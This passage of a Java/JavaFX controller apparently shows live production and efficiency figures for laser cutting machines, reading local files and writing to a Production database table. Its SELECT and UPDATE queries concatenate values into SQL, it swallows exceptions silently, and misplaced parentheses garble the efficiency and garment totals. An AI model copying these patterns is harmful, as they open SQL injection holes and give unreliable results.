             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe22.txt"));
             summe22=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine22.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog121.setText(Integer.toString(sum-summe22));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }

//nog119.setText("N/A");
//nog119.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane22.setStyle("-fx-background-color:orange;");
              eff121.setText("0%");
          }
          
          else {
              
                vboxpane22.setStyle("-fx-background-color:transparent;");
              
               
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff121.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff121.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff121.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff121.setText("N/A");
          }
          }
          
          
       
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg22.delete();
            
        }  
            
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 22 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno121.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno121.setText("Machine   "+machine_number22);
        nog121.setText("0");
        eff121.setText("0%");
        mod121.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod121.setText("Machine isn't working");
        unit121.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit121.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
        
        refresh121.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
       
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
        
        
          
   //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //Continue  
        
        int allpery=Integer.parseInt(eff1.getText().replace("%",""))+Integer.parseInt(eff11.getText().replace("%",""))+Integer.parseInt(eff12.getText().replace("%",""))+Integer.parseInt(eff13.getText().replace("%",""))+Integer.parseInt(eff14.getText().replace("%",""))+Integer.parseInt(eff15.getText().replace("%",""))
        +Integer.parseInt(eff16.getText().replace("%",""))+Integer.parseInt(eff17.getText().replace("%",""))+Integer.parseInt(eff18.getText().replace("%",""))+Integer.parseInt(eff19.getText().replace("%",""))+Integer.parseInt(eff110.getText().replace("%",""))+Integer.parseInt(eff111.getText().replace("%",""))
        +Integer.parseInt(eff112.getText().replace("%",""))+Integer.parseInt(eff113.getText().replace("%",""))+Integer.parseInt(eff114.getText().replace("%",""))+Integer.parseInt(eff115.getText().replace("%",""))+Integer.parseInt(eff116.getText().replace("%",""))+Integer.parseInt(eff117.getText().replace("%","")
        +Integer.parseInt(eff120.getText().replace("%",""))+Integer.parseInt(eff121.getText().replace("%",""))+Integer.parseInt(eff119.getText().replace("%","")));
        





        int allgary=Integer.parseInt(nog1.getText())+Integer.parseInt(nog11.getText())+Integer.parseInt(nog12.getText())+Integer.parseInt(nog13.getText())+Integer.parseInt(nog14.getText())+Integer.parseInt(nog15.getText())
        +Integer.parseInt(nog16.getText())+Integer.parseInt(nog17.getText())+Integer.parseInt(nog18.getText())+Integer.parseInt(nog19.getText())+Integer.parseInt(nog110.getText())+Integer.parseInt(nog111.getText()) 
        +Integer.parseInt(nog112.getText())+Integer.parseInt(nog113.getText())+Integer.parseInt(nog114.getText())+Integer.parseInt(nog115.getText())+Integer.parseInt(nog116.getText())+Integer.parseInt(nog117.getText()
        +Integer.parseInt(nog120.getText())+Integer.parseInt(nog121.getText())+Integer.parseInt(nog118.getText())+Integer.parseInt(nog119.getText()));
        
        
        if (workingmachinesno==0) {
        allperformance.setText("N/A");   
        }
        else {
        int newallpery=allpery/(workingmachinesno-1);
        allperformance.setText(Integer.toString(newallpery)+" %");
        }
        
        //allperformance.setText("N/A");
       // allgarments.setText("N/A");
        
        allgarments.setText(Integer.toString(allgary));
        
        
        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
        
        
        
        
//    }
//    }).start(); 
//    
//    
//      
 
           
    }
}).start();
    
      
      }
      
      catch (Exception m) {
          refresh.fire();
      }
    
    
    }

    
    
    
    
    
    
    
    
    
    @FXML
    void zerosaction(MouseEvent eventa)  {
        
        
           
           
        
    }
    
    
    
    
    
    
    
    
    @FXML
    void refre(MouseEvent event) throws IOException, InterruptedException {
   
  
      
        
    }
    
    
    
    
    
    
    
    
    
    
    
   
    
    
    @Override
    public void initialize(URL url, ResourceBundle rb) {
        
    
        
       // conn_write=db_writer.java_db();
        
        
        try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
           poth=buffr.readLine();
           buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
        } 
        
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
       //Write Log....
       
       
      Date currentDate1 = GregorianCalendar.getInstance().getTime();
      DateFormat df1 = DateFormat.getDateInstance();
      String dateString1 = df1.format(currentDate1);
      Date d1 = new Date();
      SimpleDateFormat sdf1 = new SimpleDateFormat("HH:mm:ss");
      String timeString1 = sdf1.format(d1);
      SimpleDateFormat sdf2 = new SimpleDateFormat("yyyy-MM-dd");
      String timeString2 = sdf2.format(d1);
      String valuetime = timeString1;
      String valuedate = timeString2;
       
       String xlog="Log.kady";
       File flog=new File (xlog);
       
       if (!flog.exists()) {
           
            try {
                //Create
                flog.createNewFile();
            } catch (IOException ex) {
                Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
            }
           
       }
       else {
           
       } 
       
 String sampleText = ""+valuedate+"  Viewer Started at  "+valuetime+"  Successfully." +  System.getProperty("line.separator");
        try {
            Files.write(Paths.get(xlog), sampleText.getBytes(StandardCharsets.UTF_8),
                    StandardOpenOption.CREATE, StandardOpenOption.APPEND);
            
            
        } catch (IOException ex) {
            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
        }

        
        
            
            
            //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            
//       File fol1=new File (poth+"\\Machine1.kady");
//       if (fol1.exists()) {
//           
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (fol1));
//            String v11=wq.readLine().replace("Number=","");
//            String v21=wq.readLine().replace("ID=","");
//            String v31=wq.readLine().replace("Init=","");
//            String v41=wq.readLine().replace("End=","");
//            String v51=wq.readLine().replace("Model=","");
//            String v61=wq.readLine().replace("Unit=","");
//            String v71=wq.readLine().replace("Laser_Time=","");
//            wq.close();
//            summe111=v71;
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//           
//       }
//       else {
//           
//       }
//       ////////////////////////////////////////////
//       
//       File fol2=new File (poth+"\\Machine2.kady");
//       if (fol2.exists()) {
//           
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (fol2));
//            String v12=wq.readLine().replace("Number=","");
//            String v22=wq.readLine().replace("ID=","");
//            String v32=wq.readLine().replace("Init=","");
//            String v42=wq.readLine().replace("End=","");
//            String v52=wq.readLine().replace("Model=","");
//            String v62=wq.readLine().replace("Unit=","");
//            String v72=wq.readLine().replace("Laser_Time=","");
//            wq.close();
//            summe222=v72;
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//           
//       }
//       else {
//           
//       }
//       ////////////////////////////////////////////
//       
//       File fol3=new File (poth+"\\Machine3.kady");
//       if (fol3.exists()) {
//           
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (fol3));
//            String v13=wq.readLine().replace("Number=","");
//            String v23=wq.readLine().replace("ID=","");
//            String v33=wq.readLine().replace("Init=","");
//            String v43=wq.readLine().replace("End=","");
//            String v53=wq.readLine().replace("Model=","");
//            String v63=wq.readLine().replace("Unit=","");
//            String v73=wq.readLine().replace("Laser_Time=","");
//            wq.close();
//            summe333=v73;
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//           
//       }
//       else {
//           
//       }
//       ////////////////////////////////////////////
//       
//       File fol4=new File (poth+"\\Machine4.kady");
//       if (fol4.exists()) {
//           
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (fol4));
//            String v14=wq.readLine().replace("Number=","");
//            String v24=wq.readLine().replace("ID=","");
//            String v34=wq.readLine().replace("Init=","");
//            String v44=wq.readLine().replace("End=","");
//            String v54=wq.readLine().replace("Model=","");
//            String v64=wq.readLine().replace("Unit=","");
//            String v74=wq.readLine().replace("Laser_Time=","");
//            wq.close();
//            summe444=v74;
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//           
//       }
//       else {
//           
//       }
//       ////////////////////////////////////////////
//       
//       File fol5=new File (poth+"\\Machine5.kady");
//       if (fol5.exists()) {
//           
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (fol5));
//            String v15=wq.readLine().replace("Number=","");
//            String v25=wq.readLine().replace("ID=","");
//            String v35=wq.readLine().replace("Init=","");
//            String v45=wq.readLine().replace("End=","");
//            String v55=wq.readLine().replace("Model=","");
//            String v65=wq.readLine().replace("Unit=","");
//            String v75=wq.readLine().replace("Laser_Time=","");
//            wq.close();
//            summe555=v75;
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//           
//       }
//       else {
//           
//       }
//       ////////////////////////////////////////////
//       
//       File fol6=new File (poth+"\\Machine6.kady");
//       if (fol6.exists()) {
//           
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (fol6));
//            String v16=wq.readLine().replace("Number=","");
//            String v26=wq.readLine().replace("ID=","");
//            String v36=wq.readLine().replace("Init=","");
//            String v46=wq.readLine().replace("End=","");
//            String v56=wq.readLine().replace("Model=","");
//            String v66=wq.readLine().replace("Unit=","");
//            String v76=wq.readLine().replace("Laser_Time=","");
//            wq.close();
//            summe666=v76;
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//           
//       }
//       else {
//           
//       }
//       ////////////////////////////////////////////
//




//        
//      File fzz=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
//
//        try {
//            FileUtils.deleteDirectory(fzz);
//        } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//        }
//
//
                
//File fz=new File (System.getProperty("user.home")+"\\Laser_Shifts");
//
//
//
//if (fz.exists()) {
//    
//            try {
//                FileUtils.deleteDirectory(fz);
//            } catch (IOException ex) {
//                Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//
//
//    
//            try {
//                Thread.sleep(2000);
//            } catch (InterruptedException ex) {
//                Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            /////////////////////////////////////////////////////////////////////////
//           try {
//            
//            File hn=new File (System.getProperty("user.home")+"\\Laser_Shifts");
//           if (!hn.exists()) {
//               hn.mkdirs();
//           }
//           else {
//               
//           }
//           File cx1=new File (hn+"\\summe1.txt");
//           if (!cx1.exists()) {
//               cx1.createNewFile();
//               
//               //Do something
//               
//               PrintWriter pca=new PrintWriter (new FileWriter (cx1));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               
//               PrintWriter pca=new PrintWriter (new FileWriter (cx1));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx2=new File (hn+"\\summe2.txt");
//           if (!cx2.exists()) {
//               cx2.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx2));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx2));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx3=new File (hn+"\\summe3.txt");
//           if (!cx3.exists()) {
//               cx3.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx3));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx3));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx4=new File (hn+"\\summe4.txt");
//           if (!cx4.exists()) {
//               cx4.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx4));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx4));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx5=new File (hn+"\\summe5.txt");
//           if (!cx5.exists()) {
//               cx5.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx5));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx5));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx6=new File (hn+"\\summe6.txt");
//           if (!cx6.exists()) {
//               cx6.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx6));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx6));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx7=new File (hn+"\\summe7.txt");
//           if (!cx7.exists()) {
//               cx7.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx7));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx7));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx8=new File (hn+"\\summe8.txt");
//           if (!cx8.exists()) {
//               cx8.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx8));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx8));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx9=new File (hn+"\\summe9.txt");
//           if (!cx9.exists()) {
//               cx9.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx9));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx9));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx10=new File (hn+"\\summe10.txt");
//           if (!cx10.exists()) {
//               cx10.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx10));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx10));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx11=new File (hn+"\\summe11.txt");
//           if (!cx11.exists()) {
//               cx11.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx11));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx11));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx12=new File (hn+"\\summe12.txt");
//           if (!cx12.exists()) {
//               cx12.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx12));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx12));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx13=new File (hn+"\\summe13.txt");
//           if (!cx13.exists()) {
//               cx13.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx13));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx13));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx14=new File (hn+"\\summe14.txt");
//           if (!cx14.exists()) {
//               cx14.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx14));
//               pca.print(("0"));
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx14));
//               pca.print(("0"));
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx15=new File (hn+"\\summe15.txt");
//           if (!cx15.exists()) {
//               cx15.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx15));
//               pca.print(("0"));
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx15));
//               pca.print(("0"));
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx16=new File (hn+"\\summe16.txt");
//           if (!cx16.exists()) {
//               cx16.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx16));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx16));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx17=new File (hn+"\\summe17.txt");
//           if (!cx17.exists()) {
//               cx17.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx17));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx17));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx18=new File (hn+"\\summe18.txt");
//           if (!cx18.exists()) {
//               cx18.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx18));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx18));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx19=new File (hn+"\\summe19.txt");
//           if (!cx19.exists()) {
//               cx19.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx19));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx19));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx20=new File (hn+"\\summe20.txt");
//           if (!cx20.exists()) {
//               cx20.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx20));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx20));
//               pca.print("0");
//               pca.close();
//               
//           }
//           
//           }
//           
//           catch (Exception m) {
//               
//           }
//           /////////////////////////////////
//
//    
//}
//
//
//else {
//      /////////////////////////////////////////////////////////////////////////
//           try {
//            
//            File hn=new File (System.getProperty("user.home")+"\\Laser_Shifts");
//           if (!hn.exists()) {
//               hn.mkdirs();
//           }
//           else {
//               
//           }
//           File cx1=new File (hn+"\\summe1.txt");
//           if (!cx1.exists()) {
//               cx1.createNewFile();
//               
//               //Do something
//               
//               PrintWriter pca=new PrintWriter (new FileWriter (cx1));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               
//               PrintWriter pca=new PrintWriter (new FileWriter (cx1));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx2=new File (hn+"\\summe2.txt");
//           if (!cx2.exists()) {
//               cx2.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx2));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx2));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx3=new File (hn+"\\summe3.txt");
//           if (!cx3.exists()) {
//               cx3.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx3));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx3));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx4=new File (hn+"\\summe4.txt");
//           if (!cx4.exists()) {
//               cx4.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx4));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx4));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx5=new File (hn+"\\summe5.txt");
//           if (!cx5.exists()) {
//               cx5.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx5));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx5));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx6=new File (hn+"\\summe6.txt");
//           if (!cx6.exists()) {
//               cx6.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx6));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx6));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx7=new File (hn+"\\summe7.txt");
//           if (!cx7.exists()) {
//               cx7.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx7));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx7));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx8=new File (hn+"\\summe8.txt");
//           if (!cx8.exists()) {
//               cx8.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx8));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx8));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx9=new File (hn+"\\summe9.txt");
//           if (!cx9.exists()) {
//               cx9.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx9));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx9));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx10=new File (hn+"\\summe10.txt");
//           if (!cx10.exists()) {
//               cx10.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx10));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx10));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx11=new File (hn+"\\summe11.txt");
//           if (!cx11.exists()) {
//               cx11.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx11));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx11));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx12=new File (hn+"\\summe12.txt");
//           if (!cx12.exists()) {
//               cx12.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx12));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx12));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx13=new File (hn+"\\summe13.txt");
//           if (!cx13.exists()) {
//               cx13.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx13));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx13));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx14=new File (hn+"\\summe14.txt");
//           if (!cx14.exists()) {
//               cx14.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx14));
//               pca.print(("0"));
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx14));
//               pca.print(("0"));
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx15=new File (hn+"\\summe15.txt");
//           if (!cx15.exists()) {
//               cx15.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx15));
//               pca.print(("0"));
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx15));
//               pca.print(("0"));
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx16=new File (hn+"\\summe16.txt");
//           if (!cx16.exists()) {
//               cx16.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx16));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx16));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx17=new File (hn+"\\summe17.txt");
//           if (!cx17.exists()) {
